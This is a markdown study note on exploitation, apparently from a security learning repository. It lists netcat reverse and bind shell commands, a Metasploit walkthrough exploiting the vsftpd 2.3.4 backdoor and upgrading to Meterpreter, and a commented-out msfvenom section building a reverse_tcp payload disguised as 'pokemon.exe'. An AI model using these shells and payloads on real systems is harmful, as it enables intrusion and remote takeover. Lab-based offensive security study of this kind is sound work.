<!-- /notes/cyber/exploitation.md -->

<br>

`Last updated: Tue 29 Nov 2022 20:20 IST`

<br>

<h1 id="additional-notes">Additional notes</h1>

## nc

#### Reverse shell:

1. Attacker exploits target machine  
2. Attacker listens on select port<br>`nc -lvp 4444`  
3. Target reverse TCP connection to attacker executing bash shell<br>`nc attacker_ip 4444 -e /bin/bash`

#### Bind shell:

1. Attacker exploits target machine  
2. Target listens on select port and executes bash shell<br>`nc -lvp 4444 -e /bin/bash`  
3. Attacker bind TCP connection to victim at select port<br>`nc target_ip 4444`

<br>
<h1 id="metasploit-framework">Metasploit Framework</h1>

## msfdb

```bash
msfdb init
msfdb start
msfdb stop
```

## msfconsole

```bash
help
search
use
```

#### 1. VSFTPD v2.3.4 Backdoor Command Execution

_`msf6 > `_

```bash
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
```

_`msf6 exploit(unix/ftp/vsftpd_234_backdoor) >`_

```bash
show options #show exploit options
show payloads #show exploit payloads
set RHOSTS 10.8.22.123 #set module options
set payload 0 #set payload options
exploit #or run
```
##### (Ctrl + Z) to send session to background.

#### 2. Upgrade shell to Meterpreter:

_`msf6 exploit(unix/ftp/vsftpd_234_backdoor) >`_

```bash
sessions #see active sessions
search shell_to #search for module
use post/multi/message/shell_to_meterpreter
```

#### 3. Shell to Meterpreter Upgrade

_`msf6 post(multi/manage/shell_to_meterpreter) >`_

```bash
show options
sessions
set SESSION 1
exploit
sessions
sessions -i 2 #enter meterpreter session
```

##### (Ctrl + Z) to send session to background.

<!--
```bash
use auxiliary/scanner/portscan/syn
```
-->

## msfvenom

```bash
msfvenom -h
msfvenom -l payloads
msfvenom -l formats
```

<!--
#### 1. Set up listener on attacker's machine:

```bash
nc -lvp 7777 -e /bin/bash #listen, verbose, port, execute
```


#### 2. In `msfconsole`:

```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.172.128
set LPORT 7777
exploit
# set ExitOnSession false
# exploit -j
```

#### 3. Generate payload:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.172.128 LPORT=7777 -f exe > pokemon.exe
```

#### 4. Send to Windows 7 VM and run it
-->